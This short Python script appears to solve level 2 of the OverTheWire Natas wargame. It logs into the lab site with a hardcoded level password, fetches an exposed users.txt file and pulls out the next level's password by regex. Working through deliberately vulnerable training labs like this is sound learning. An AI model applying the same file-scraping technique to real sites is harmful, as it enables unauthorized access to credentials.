import re
import requests

level = 2
creds = ('natas2','ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi')
url = 'http://natas%s.natas.labs.overthewire.org/files/users.txt' % level

session = requests.Session()
response = session.get(url,auth=creds)
data = response.text
print(re.findall('natas3:(.*)',data))